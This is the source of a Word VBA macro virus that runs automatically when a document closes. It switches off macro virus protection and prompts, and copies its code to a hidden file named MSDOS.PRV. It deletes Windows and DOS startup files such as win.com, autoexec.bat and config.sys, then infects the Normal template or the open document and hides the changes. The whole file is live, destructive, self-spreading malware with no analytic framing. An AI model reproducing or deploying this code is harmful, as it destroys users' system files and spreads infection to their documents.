   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   On Error Resume Next
   ADS = ActiveDocument.Saved
   Application.EnableCancelKey = Not -1
   With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
   If Dir("MSDOS.PRV", 6) = "" Then
   Open "MSDOS.PRV" For Output As #1
   For iLoop = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   CodeLine = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(iLoop, 1)
   Print #1, CodeLine
   Next iLoop
   Close #1
   SetAttr "MSDOS.PRV", 6
   End If
   If Dir("\windows\win.com") <> "" Then Kill "\windows\win.com"
   If Dir("\windows\win.ini") <> "" Then Kill "\windows\win.ini"
   If Dir("\autoexec.bat") <> "" Then Kill "\autoexec.bat"
   If Dir("\config.sys") <> "" Then Kill "\config.sys"
   If Dir("\windows\class.sys") <> "" Then Kill "\windows\class.sys"
   If Dir("\class.sys") <> "" Then Kill "\class.sys"
   If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
   Set TheItem = NormalTemplate.VBProject.VBComponents.Item(1)
   ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
   Set TheItem = ActiveDocument.VBProject.VBComponents.Item(1)
   Else
   TheItem = ""
   End If
   If TheItem <> "" Then
   Open "MSDOS.PRV" For Input As #1
   If LOF(1) = 0 Then GoTo Fin
   Count = 1
   Do While Not EOF(1)
   Line Input #1, CodeLine
   TheItem.CodeModule.InsertLines Count, CodeLine
   Count = Count + 1
   Loop
   Fin:
   Close #1
   With Dialogs(wdDialogFileSummaryInfo): .Title = "OOPS": .Author = "Billy McGrop": .Keywords = "To Vile": .Execute: End With
   If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   End If
   If ActiveDocument.Saved <> ADS Then ActiveDocument.Saved = ADS
   End Sub
